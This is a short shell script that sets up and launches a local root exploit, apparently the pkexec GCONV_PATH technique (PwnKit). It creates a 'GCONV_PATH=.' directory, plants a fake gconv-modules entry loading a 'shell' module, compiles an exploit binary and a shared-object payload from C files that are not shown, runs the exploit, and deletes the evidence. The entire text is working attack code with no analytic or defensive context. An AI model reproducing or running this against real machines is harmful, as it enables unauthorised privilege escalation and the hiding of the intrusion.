#!/bin/sh

echo "creating GCONV_PATH=. directory..."
mkdir GCONV_PATH=. && cd GCONV_PATH=.
echo "nice initialization" > exploit
chmod +x exploit
cd ..

echo "creating fake gconv-module..."
mkdir exploit && cd exploit
echo "module INTERNAL lobjan// shell 1" > gconv-modules
cd ..

echo "compiling exploit binary..."
gcc -o cd80 cd80.c
gcc -fPIC -shared -nostartfiles -o exploit/shell.so shell.c

echo "cd80"
./cd80

echo "cleaning up..."
rm -rf cd80 exploit GCONV_PATH=.
